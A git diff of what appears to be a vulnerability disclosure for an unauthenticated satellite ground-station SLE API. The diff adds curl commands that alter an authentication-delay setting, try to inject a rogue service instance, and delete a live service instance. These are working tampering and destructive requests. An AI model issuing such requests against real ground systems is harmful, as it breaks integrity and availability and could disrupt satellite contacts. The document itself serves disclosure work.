@@ -132,7 +132,7 @@ curl -s http://127.0.0.1:2048/api/sle-config/ | jq .
 
 ## 4. Exploitation Capability Validation
 
-You will **prove** modification is possible
+You will **prove** modification is possible - then **execute it**
 
 ### 4.1 Check allowed methods
 ```bash
@@ -145,14 +145,90 @@ curl -i -X OPTIONS http://127.0.0.1:2048/api/service-instances/test
 Expected:
 - `Allow:` header including `POST`, `PATCH`, or `DELETE`
 
-### 4.2 Interpretation
-If modification verbs are allowed **without authentication**, then:
 
-- Integrity is compromised
-- Availability is compromised
-- Full mission impact is possible
+### 4.2 Exploit: Modify a Runtime Configuration Parameter
 
-No further exploitation is required to prove risk.
+Pick a high-impact parameter - `authentication-delay` - and increase it to expand the brute-force window:
+
+```bash
+curl -i -X PATCH http://127.0.0.1:2048/api/sle-config/authentication-delay \
+  -H "Content-Type: application/json" \
+  -d '{"value": 9999}'
+```
+
+<img width="1096" height="152" alt="2026-03-19_12-15" src="https://github.com/user-attachments/assets/39269311-43a4-4c06-916f-e80c691c894e" />
+
+
+Verify the change took effect:
+
+```bash
+curl -s http://127.0.0.1:2048/api/sle-config/authentication-delay | jq .
+```
+
+<img width="168" height="59" alt="2026-03-19_12-16" src="https://github.com/user-attachments/assets/beb6f408-4629-4869-bab3-efedae08943e" />
+
+
+**Impact:** You have modified a live operational parameter with no credentials, no audit trail challenge, and no rejection. This is **unauthenticated write access to a running system**
+
+
+### 4.3 Attempted: Inject a Rogue Service Instance
+
+Attempt to POST a fake service instance:
+
+```bash
+curl -i -X POST http://127.0.0.1:2048/api/service-instances \
+  -H "Content-Type: application/json" \
+  -d '{"service-instance-identifier": "rogue-si-001"}'
+```
+
+<img width="1156" height="256" alt="2026-03-19_12-21" src="https://github.com/user-attachments/assets/2b6ee135-3513-4fd7-89c8-23d8a676b803" />
+
+
+Expected result:
+- `HTTP/1.1 404 Not Found`
+
+**Finding:** The `/api/service-instances` collection endpoint does not accept POST for instance creation. However, this does **not** reduce risk - instance-level PATCH and DELETE are still permitted without authentication, as shown in step 4.1 and 4.4.
+
+---
+
+### 4.4 Exploit: Destroy a Legitimate Service Instance
+
+The service instances discovered in step 3.1 are real operational identifiers, for example:
+
+<pre>
+sagr=1.spack=VST-PASS0001.rsl-fg=1.raf=onlt1
+sagr=1.spack=VST-PASS0001.fsl-fg=1.cltu=cltu1
+</pre>
+
+Issue an unauthenticated DELETE against one:
+
+```bash
+curl -i -X DELETE "http://127.0.0.1:2048/api/service-instances/sagr=1.spack=VST-PASS0001.rsl-fg=1.raf=onlt1"
+```
+
+Confirm it is gone:
+
+```bash
+curl -s http://127.0.0.1:2048/api/service-instances/ | jq .
+```
+
+<img width="1375" height="200" alt="2026-03-19_12-22" src="https://github.com/user-attachments/assets/145d272f-edcc-4203-9b0f-ff1daec3738e" />
+
+
+**Impact:** This is a **single-command availability attack**. A legitimate link session is terminated with no authentication required. In an operational environment this would drop a satellite contact.
+
+---
+
+### 4.5 Interpretation
+
+| Action | Auth Required | Impact |
+|---|---|---|
+| Read config + credentials | None | Confidentiality broken |
+| Modify `authentication-delay` | None | Integrity broken |
+| Inject rogue service instance | None | Not possible via POST (404) |
+| Delete live service instance | None | Availability broken |
+
+All three pillars of the **CIA triad** are compromised from a single unauthenticated network position. No exploit code, no credentials, and no elevated privileges were required.
 
 ---
 
